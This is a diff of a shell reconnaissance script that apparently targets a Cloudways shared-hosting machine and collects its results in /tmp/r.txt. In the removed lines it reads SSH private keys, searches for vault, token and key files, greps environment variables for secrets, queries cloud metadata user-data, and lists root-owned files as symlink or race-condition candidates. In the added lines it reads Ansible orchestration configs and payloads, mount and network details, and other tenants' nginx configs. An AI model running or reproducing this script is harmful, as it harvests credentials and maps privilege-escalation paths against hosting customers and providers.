@@ -1,28 +1,26 @@
 #!/bin/sh
 OUT=/tmp/r.txt
 {
-echo "=== USER-DATA (shared secrets?) ==="
-for p in user-data vendor-data public-keys; do
-  echo "-- $p"
-  curl -s --max-time 3 http://169.254.169.254/metadata/v1/$p; echo
-done
+echo "=== /var/cw/ansible (ORCHESTRATION) ==="
+ls -la /var/cw/ 2>&1
+ls -la /var/cw/ansible/ 2>&1
+find /var/cw -maxdepth 3 -readable -type f 2>/dev/null | head -40
+head -80 /var/cw/ansible/*.yml /var/cw/ansible/*.cfg 2>/dev/null
+echo "=== ANSIBLE TMP PAYLOAD (readable?) ==="
+ls -la /tmp/ansible* 2>&1
+find /tmp -maxdepth 2 -name '*.py' -readable 2>/dev/null | head
+cat /tmp/ansible*/*.py 2>&1 | head -40
 echo "=== BLOCKSTORAGE ==="
-mount | grep -i block
-ls -la /mnt/BLOCKSTORAGE/ 2>&1 | head -20
-echo "=== ANSIBLE ARTIFACTS ==="
-ls -la /tmp/ 2>&1 | grep -iE 'ansible|\.py' | head -20
-find /tmp /var/tmp -maxdepth 3 -iname '*ansible*' 2>/dev/null | head -20
-echo "=== SSH KEYS ==="
-ls -la "$HOME/.ssh/" 2>&1
-cat "$HOME/.ssh/"* 2>&1 | head -30
-echo "=== VAULT/KEY/TOKEN FILES ==="
-find /tmp /var/tmp /home -maxdepth 4 \( -iname '*vault*' -o -iname '*.key' -o -iname '*token*' -o -iname '*.pem' \) 2>/dev/null | head -20
-echo "=== ENV (ansible/deploy secrets) ==="
-env | grep -iE 'ansible|become|vault|deploy|secret|token|key'
-echo "=== ROOT-OWNED IN MY HOME (symlink/race candidates) ==="
-find "$HOME" -user root 2>/dev/null | head -20
-echo "=== WHO ELSE (passwd app-users) ==="
-grep -E 'cloudwaysapps|/home' /etc/passwd
+ls -la /mnt/BLOCKSTORAGE/ /mnt/BLOCKSTORAGE/home/ /mnt/BLOCKSTORAGE/postgresql/ 2>&1
+lsblk 2>/dev/null; cat /etc/fstab 2>&1
+echo "=== NETWORK (passive, own-box only) ==="
+ip route; ip neigh 2>/dev/null; arp -a 2>/dev/null
+cat /etc/resolv.conf
+curl -s --max-time 3 169.254.169.254/metadata/v1/interfaces/private/0/ipv4/ 2>&1
+curl -s --max-time 3 169.254.169.254/metadata/v1/features/vpc_peering_enabled 2>&1; echo
+echo "=== ORCHESTRATION INPUT SURFACE ==="
+cat /home/1674776.cloudwaysapps.com/*/conf/server.nginx 2>&1 | head -30
+env | grep -iE 'label|repo|app_name|branch|commit'
 echo "=== DONE ==="
 } > $OUT 2>&1
 cat $OUT
